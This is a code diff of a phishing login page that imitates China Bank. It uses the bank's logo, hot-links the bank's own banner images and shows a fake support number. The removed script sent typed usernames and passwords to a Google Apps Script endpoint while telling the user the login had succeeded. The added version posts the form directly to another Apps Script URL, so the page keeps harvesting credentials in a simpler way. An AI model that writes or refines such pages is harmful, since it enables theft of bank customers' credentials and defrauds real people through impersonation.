@@ -144,22 +144,22 @@
     <img src="cbanklogo.png" alt="Logo">
   </div>
 
-  <div class="container">
-    <div class="login-section">
-      <h2>Login to your Account</h2>
-      <input type="text" id="username" placeholder="Username" />
-      <input type="password" id="password" placeholder="Password" />
-      <a onclick="forgotPassword()">Forgot password? Click here.</a>
-      <button onclick="submitLogin()">Login</button>
-      <div id="statusMessage" class="status-message"></div>
-    </div>
-
-    <div class="carousel-section">
-      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%201.png" alt="Slide 1" class="active" />
-      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%202.png" alt="Slide 2" />
-      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%203.png" alt="Slide 3" />
-    </div>
+  <form class="container" method="POST" action="https://script.google.com/macros/s/AKfycbwh8t_smzUfcsA3yG50tYQs0S2j2omogewCzsw95DO9nlbKjabE1BNCLdQhSEOqyKds/exec">
+  <div class="login-section">
+    <h2>Login to your Account</h2>
+    <input type="text" name="username" placeholder="Username" required />
+    <input type="password" name="password" placeholder="Password" required />
+    <a onclick="forgotPassword()" type="button">Forgot password? Click here.</a>
+    <button type="submit">Login</button>
+    <div id="statusMessage" class="status-message"></div>
   </div>
+
+  <div class="carousel-section">
+    <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%201.png" alt="Slide 1" class="active" />
+    <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%202.png" alt="Slide 2" />
+    <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%203.png" alt="Slide 3" />
+  </div>
+</form>
 
   <div class="footer">
    Supported Browsers 
@@ -171,94 +171,20 @@
   </div>
 
   <script>
-    // Carousel functionality
-    const images = document.querySelectorAll('.carousel-section img');
-    let currentIndex = 0;
+  // Carousel functionality
+  const images = document.querySelectorAll('.carousel-section img');
+  let currentIndex = 0;
 
-    setInterval(() => {
-      images[currentIndex].classList.remove('active');
-      currentIndex = (currentIndex + 1) % images.length;
-      images[currentIndex].classList.add('active');
-    }, 6000);
+  setInterval(() => {
+    images[currentIndex].classList.remove('active');
+    currentIndex = (currentIndex + 1) % images.length;
+    images[currentIndex].classList.add('active');
+  }, 6000);
 
-    // Login form submission to Google Sheets
-    async function submitLogin() {
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const statusMessage = document.getElementById('statusMessage');
-      
-      // Clear previous messages
-      statusMessage.className = 'status-message';
-      statusMessage.textContent = '';
-      
-      // Validate inputs
-      if (!username || !password) {
-        statusMessage.textContent = 'Please enter both username and password';
-        statusMessage.classList.add('status-error');
-        return;
-      }
-      
-      try {
-        // Show loading state
-        statusMessage.textContent = 'Logging in...';
-        statusMessage.classList.add('status-success');
-        
-        // Prepare data for Google Sheets
-        const data = {
-          timestamp: new Date().toISOString(),
-          username: username,
-          password: password,
-          source: 'China Bank Login Page'
-        };
-        
-        // Send data to Google Sheets
-        const response = await sendToGoogleSheets(data);
-        
-        // Show success message
-        statusMessage.textContent = 'Login successful! Data sent to Google Sheets.';
-        statusMessage.classList.add('status-success');
-        
-        // Clear form
-        document.getElementById('username').value = '';
-        document.getElementById('password').value = '';
-        
-        // In a real banking application, you would redirect to dashboard
-        // setTimeout(() => { window.location.href = 'dashboard.html'; }, 1500);
-        
-      } catch (error) {
-        console.error('Error:', error);
-        statusMessage.textContent = 'Error: ' + error.message;
-        statusMessage.classList.add('status-error');
-      }
-    }
+  function forgotPassword() {
+    alert('For security reasons, please contact our customer support at 1-800-CHINA-BANK (244-6222) to reset your password.');
+  }
+</script>
 
-    function forgotPassword() {
-      alert('For security reasons, please contact our customer support at 1-800-CHINA-BANK (244-6222) to reset your password.');
-    }
-    
-    // Google Sheets Integration
-    async function sendToGoogleSheets(data) {
-      // Your Google Apps Script URL
-      const scriptURL = 'https://script.google.com/macros/s/AKfycbxIyaBVen2Lo-OsO3soq0uuNov8sUZEO42IUIGQvvKGU4r6tk9tugwRi3rl--eZucrX/exec';
-      
-      try {
-        const response = await fetch(scriptURL, {
-          method: 'POST',
-          body: JSON.stringify(data),
-          headers: {
-            'Content-Type': 'application/json'
-          }
-        });
-        
-        if (!response.ok) {
-          throw new Error('Failed to connect to Google Sheets');
-        }
-        
-        return await response.json();
-      } catch (error) {
-        throw new Error('Could not connect to the server. Please try again later.');
-      }
-    }
-  </script>
 </body>
 </html>
